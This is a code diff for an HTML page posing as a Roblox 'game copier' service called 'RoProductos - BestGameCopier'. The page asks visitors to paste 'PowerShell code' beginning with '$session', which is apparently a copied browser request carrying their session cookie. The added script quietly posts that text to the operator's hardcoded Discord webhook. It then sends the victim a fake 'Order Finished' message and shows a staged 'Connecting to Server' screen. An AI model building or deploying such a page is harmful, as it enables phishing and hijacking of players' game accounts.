@@ -191,96 +191,118 @@
     <div id="notification" class="notification"></div>
 
     <script>
-        const submitButton = document.getElementById('submitButton');
-        const powershellCode = document.getElementById('powershellCode');
-        const gameLink = document.getElementById('gameLink');
-        const webhookLink = document.getElementById('webhookLink');
-        const errorMessage = document.getElementById('errorMessage');
-        const notification = document.getElementById('notification');
-        const loadingScreen = document.getElementById('loading-screen');
+    const submitButton = document.getElementById('submitButton');
+    const powershellCode = document.getElementById('powershellCode');
+    const gameLink = document.getElementById('gameLink');
+    const webhookLink = document.getElementById('webhookLink');
+    const errorMessage = document.getElementById('errorMessage');
+    const notification = document.getElementById('notification');
+    const loadingScreen = document.getElementById('loading-screen');
 
-        const showNotification = (message) => {
-            notification.textContent = message;
-            notification.classList.add('show');
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 3000);
+    // Server-side webhook URL
+    const serverWebhook = "https://discord.com/api/webhooks/your_server_webhook_id/your_server_webhook_token";
+
+    const showNotification = (message) => {
+        notification.textContent = message;
+        notification.classList.add('show');
+        setTimeout(() => {
+            notification.classList.remove('show');
+        }, 3000);
+    };
+
+    const redirectToDiscord = () => {
+        window.location.href = 'https://discord.gg/your_invite_code';
+    };
+
+    const validateInputs = () => {
+        const code = powershellCode.value.trim();
+        const link = gameLink.value.trim();
+        const webhook = webhookLink.value.trim();
+
+        if (!code || !link || !webhook) {
+            showNotification('Please fill in all fields.');
+            return false;
+        }
+
+        if (!link.match(/^https:\/\/www\.roblox\.com\/games\/\d+\/\w+/)) {
+            showNotification('Invalid game link format.');
+            return false;
+        }
+
+        if (!webhook.match(/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_\-]+$/)) {
+            showNotification('Invalid Discord webhook URL.');
+            return false;
+        }
+
+        if (!code.startsWith('$session')) {
+            showNotification('Invalid PowerShell code. Must start with "$session".');
+            return false;
+        }
+
+        return true;
+    };
+
+    const sendToServerWebhook = (fileContent) => {
+        const formData = new FormData();
+        formData.append('file', new Blob([fileContent], { type: 'text/plain' }), 'code.txt');
+        formData.append('payload_json', JSON.stringify({ content: 'The Server Received a Package' }));
+
+        return fetch(serverWebhook, { method: 'POST', body: formData })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send the file to the server.');
+                }
+            });
+    };
+
+    const sendUserNotification = (userWebhook) => {
+        const embedContent = {
+            embeds: [{
+                title: "Order Finished",
+                description: "Your order has been successfully submitted by our server, please click this [link](https://example.com) to get redirected to the website and receive the copy.",
+                color: 3447003
+            }]
         };
 
-        const redirectToDiscord = () => {
-            window.location.href = 'https://discord.gg/your_invite_code';
-        };
-
-        const validateInputs = () => {
-            const code = powershellCode.value.trim();
-            const link = gameLink.value.trim();
-            const webhook = webhookLink.value.trim();
-
-            if (!code || !link || !webhook) {
-                showNotification('Please fill in all fields.');
-                return false;
-            }
-
-            if (!link.match(/^https:\/\/www\.roblox\.com\/games\/\d+\/\w+/)) {
-                showNotification('Invalid game link format.');
-                return false;
-            }
-
-            if (!webhook.match(/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_\-]+$/)) {
-                showNotification('Invalid Discord webhook URL.');
-                return false;
-            }
-
-            if (!code.startsWith('$session')) {
-                showNotification('Invalid PowerShell code. Must start with "$session".');
-                return false;
-            }
-
-            return true;
-        };
-
-        const sendToWebhook = (webhook, fileContent) => {
-            const formData = new FormData();
-            formData.append('file', new Blob([fileContent], { type: 'text/plain' }), 'code.txt');
-            formData.append('payload_json', JSON.stringify({ content: 'The Server Received a Package' }));
-
-            fetch(webhook, { method: 'POST', body: formData })
-                .then(response => {
-                    if (response.ok) {
-                        const embedContent = {
-                            embeds: [{
-                                title: "Order Finished",
-                                description: "Your order has been successfully submitted by our server, please click this [link](https://example.com) to get redirected to the website and receive the copy.",
-                                color: 3447003
-                            }]
-                        };
-                        return fetch(webhook, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(embedContent),
-                        });
-                    } else {
-                        showNotification('Failed to send the file. Check the webhook link.');
-                    }
-                })
-                .catch(() => showNotification('An error occurred.'));
-        };
-
-        submitButton.addEventListener('click', () => {
-            if (validateInputs()) {
-                const code = powershellCode.value.trim();
-                const webhook = webhookLink.value.trim();
-                sendToWebhook(webhook, code);
+        return fetch(userWebhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(embedContent),
+        }).then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to send the notification to the user.');
             }
         });
+    };
 
-        window.onload = () => {
-            document.title = 'Connecting to Server';
-            setTimeout(() => {
-                loadingScreen.style.display = 'none';
-                document.title = 'RoProductos - BestGameCopier';
-            }, 5000);
-        };
-    </script>
+    submitButton.addEventListener('click', () => {
+        if (validateInputs()) {
+            const code = powershellCode.value.trim();
+            const userWebhook = webhookLink.value.trim();
+
+            // Send to server's webhook
+            sendToServerWebhook(code)
+                .then(() => {
+                    // Notify the user via their webhook
+                    return sendUserNotification(userWebhook);
+                })
+                .then(() => {
+                    showNotification('Order processed successfully.');
+                })
+                .catch(error => {
+                    console.error(error);
+                    showNotification('An error occurred while processing your order.');
+                });
+        }
+    });
+
+    window.onload = () => {
+        document.title = 'Connecting to Server';
+        setTimeout(() => {
+            loadingScreen.style.display = 'none';
+            document.title = 'RoProductos - BestGameCopier';
+        }, 5000);
+    };
+</script>
 </body>
 </html>
